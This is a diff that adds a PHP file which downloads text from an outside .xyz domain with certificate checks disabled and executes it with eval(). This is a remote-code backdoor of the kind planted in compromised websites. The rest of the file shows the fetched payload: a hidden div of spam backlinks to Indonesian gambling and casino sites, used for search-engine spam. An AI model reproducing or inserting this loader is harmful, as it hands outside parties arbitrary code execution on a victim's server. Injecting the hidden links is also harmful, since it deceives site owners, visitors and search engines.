@@ -1,0 +1,30 @@
+<?php
+$url = 'https://a-m-a-n-a-j-a.xyz/test.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
+
+
+
+ISI FILE https://a-m-a-n-a-j-a.xyz/test.txt
+<!-- This is BACKLINK FORM -->
+<div style="display:none;">
+<a href="https://rupiahtotoni.com/">rupiahtoto</a>
+<a href="https://rupiahpantau.com/">rupiahtoto</a>
+<a href="https://rupiahidn.com/">rupiahtoto</a>
+<a href="https://rupiahjanuari.com/">rupiahtoto</a>
+<a href="https://rupiahbebas.com/">rupiahtoto</a>
+<a href="https://www.smiletails.fi/">rupiahtoto</a>
+<a href="https://casinobarcelona-es.es/">rupiahtoto</a>
+<a href="https://rupihtoto-alt.jimdofree.com/">rupiahtoto</a>
+<a href="https://rupiahtoto.jimdofree.com/">rupiahtoto</a>
+<a href="https://rtprupiahtoto.xyz/">rupiahtoto</a>
+<a href="https://bonusrupiahtoto.org/">rupiahtoto</a>
+<a href="https://rupiahtoto888daftar.com/">rupiahtoto</a>
+<a href="https://rupiahbijak.com/">rupiahtoto</a>
+</div><!-- This is BACKLINK FORM -->
